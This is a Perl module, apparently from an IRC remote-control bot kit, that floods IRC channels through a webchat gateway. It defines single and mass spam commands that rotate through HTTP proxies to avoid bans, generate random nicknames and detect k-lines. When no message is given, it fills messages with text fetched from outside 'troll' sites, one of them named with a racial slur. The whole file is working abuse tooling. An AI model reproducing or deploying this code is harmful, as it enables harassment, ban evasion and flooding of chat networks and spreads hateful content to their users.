# Use a webchat gateway to flood. Only works with HTTP proxies currently.

package IRC::RemoteControl::Personality::Webchat;

use Moose::Role;

use AnyEvent;
use AnyEvent::HTTP;
use JSON::XS;
use URI;
use URI::QueryParam;
use IRC::RemoteControl::Util;
use List::Util qw/shuffle/;

has 'webchat_requests' => (
    is => 'rw',
    isa => 'HashRef',
    lazy => 1,
    default => sub { {} },  # id => \@guards
);

has 'timers' => (
    is => 'rw',
    isa => 'ArrayRef',
    lazy => 1,
    default => sub { [] },
);

has 'next_id' => (
    is => 'rw',
    isa => 'Int',
    default => 1,
);

has 'mass_spam_delay' => (
    is => 'rw',
    isa => 'Num',
    default => 0.5,
);

# register spam and mass-spam commands
after 'setup' => sub {
    my ($self) = @_;

    $self->register_command('webchat-spam' => \&webchat_cmd_handler);
    $self->register_command('webchat-mass-spam' => \&webchat_cmd_handler);
};

sub webchat_cmd_handler {
    my ($self, $h, $cmd, $args) = @_;

    # we should have the webchat endpoint in dest_addr
    my $dest_addr = $self->target_address;
    if (! $dest_addr || $dest_addr !~ /^(http\S+)/i) {
        $h->push_write("Attemping to use webchat module but target is not an HTTP endpoint\n");
        return;
    }

    my ($chan, $msg) = $args =~ /^(#\S+)(?:\s+(.+))?/i;
    unless ($chan) {
        return $h->push_write("Usage: webchat-spam " .
            "#freenode YES HELLO" .
            "BIKCMP HERE\n");
    }

    if ($cmd eq 'webchat-spam') {
        $self->webchat_spam_chan($self->get_random_webchat_proxy, $h, $dest_addr, $chan, $msg);
    } elsif ($cmd eq 'webchat-mass-spam') {
        $self->webchat_mass_spam_chan($h, $dest_addr, $chan, $msg);
    }
}

sub webchat_mass_spam_chan {
    my ($self, $h, $dest_addr, $chan, $msg) = @_;
    
    my $i = 0;

    my @proxies = $self->get_available_webchat_proxies;
    if ($self->require_proxy && ! @proxies) {
        $h->push_write("Out of HTTP proxies and require_proxy = 1\n");
        return;
    }

    foreach my $proxy (@proxies) {
        my $w = AnyEvent->timer(after => $i, cb => sub {
            $self->h->push_write("Spamming $chan with proxy " . $proxy->description . "...\n");
            $self->webchat_spam_chan($proxy, $h, $dest_addr, $chan, $msg);
        });

        $i += $self->mass_spam_delay;

        push @{ $self->timers }, $w;
    }
}

sub get_available_webchat_proxies {
    my ($self) = @_;

    my @proxies = ( $self->available_proxies('http'),
                    $self->available_proxies('https') );

    return @proxies;
}

sub get_random_webchat_proxy {
    my ($self) = @_;

    my @proxies = $self->get_available_webchat_proxies;
    @proxies = shuffle @proxies;
    return $proxies[0];
}

sub webchat_spam_chan {
    my ($self, $http_proxy, $h, $dest_addr, $chan, $msg) = @_;

    if ($self->require_proxy && ! $http_proxy) {
        $h->push_write("Out of HTTP proxies and require_proxy = 1\n");
        return;
    }

    my $debug = 1;
    my $troll_me = 0;

    my $nick = IRC::RemoteControl::Util->gen_nick;

    my $s; # session
    my $t = 0; # step?

    $AnyEvent::HTTP::USERAGENT = 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8';
    $AnyEvent::HTTP::MAX_PER_HOST = 8; # docs say dont make this bigger than 4...

    my $failed = 0;

    my @steps = (
        ['/e/n', nick => $nick],  # nick
        ['/e/s'],  # session?
        ['/e/p', c => "JOIN $chan"],  # join
        ['/e/s'],
        ['/e/s'],
        ['/e/p', c => "PRIVMSG $chan :" . ($msg || '%%TROLL%%')],  # privmsg
    );

    # generate an id for this session
    my $id = $self->next_id;
    $self->next_id($id + 1);

    my $fail = sub {
        if ($http_proxy) {
            $http_proxy->ok(0);
            $http_proxy->in_use(0);
        }

        $failed = 1;
        $self->webchat_requests->{$id} = [];
        return 0;
    };

    # closure for making a POST
    my $post_req; $post_req = sub {
        my ($step) = @_;

        my ($url, %params) = @$step;

        return if $failed;

        # add session id if present
        $params{s} = $s if $s;

        # build URL
        my $u = new URI("$dest_addr$url");
        $params{r} = time();  # cache-busting probably unnecessary
        $params{t} = $t if $t;
        $u->query_form_hash(%params);

        # debug
        $h->push_write(" >> $u\n") if $self->debug;

        # use proxy if available
        my @req;
        if ($http_proxy) {
            my @proxy = ($http_proxy->proxy_address);
            push @proxy, ($http_proxy->proxy_port || 80);
            push @proxy, $http_proxy->scheme;;
            push @req, (proxy => \@proxy);

            $http_proxy->in_use(1);
        }

        # command
        my $c = $params{c};

        my $do_post = sub {
            # do request
            my $guard = http_request(POST => $u->as_string, @req, sub {
                my ($body, $hdr) = @_;

                # need 2XX HTTP response
                if ($hdr->{Status} !~ /^2/) {
                    $h->push_write("Error: $hdr->{Status} $hdr->{Reason}\n");
                    return $fail->();
                }

                unless ($body) {
                    $h->push_write("Failed to get response body\n");
                    return $fail->();
                }

                # klined? probably.
                my ($klined_ip) = $body =~ /Your reported IP \[([\.\d\:]+)\] is banned/i;
                if ($klined_ip) {
                    $h->push_write("IP ($klined_ip) is k-lined\n");
                    return $fail->();
                }

                # parse JSON response
                my $info = JSON::XS->new->decode($body);
                unless ($info) {
                    $h->push_write("Failed to parse JSON: $body\n");
                    return $fail->();
                }

                # should have session token
                unless ($s) {
                    $s = $info->[1];
                    unless ($s) {
                        $h->push_write("Fatal error: webchat client didn't get session token\n");
                        return $fail->();
                    }
                }
                
                if ($debug) {
                    #$h->push_write($body . "\n----\n");
                }

                # do next step
                my $next_step = shift @steps;
                if ($next_step) {
                    $post_req->($next_step);
                } else {
                    # done, cleanup
                    $http_proxy->in_use(0);
                    $self->webchat_requests->{$id} = [];
                }
            });


            # save guard.
            push @{$self->webchat_requests->{$id}}, $guard;

            return $guard;
        };

        # substitute random troll?
        # if no message specified, pull one from troll_me or SMNS
        if ($c && $c =~ /%%TROLL%%/) {
            # do async request for troll text
            my $troll_url = rand() < 0.5 ? 'http://rolloffle.churchburning.org/troll_me_text.php' :
                'http://shitmyniggersays.com/random.php';

            http_get $troll_url, sub {
                my ($body, $hdr) = @_;

                if ($hdr->{Status} !~ /^2/) {
                    $h->push_write("Error fetching $troll_url: $hdr->{Status} $hdr->{Reason}\n");
                    return $fail->();
                }

                $params{c} =~ s/%%TROLL%%/$body/sm;
                return $do_post->();
            };
        } else {
            return $do_post->();
        }
    };

    push @{$self->webchat_requests->{$id}}, $post_req->(shift @steps);

    return 1;
}

1;
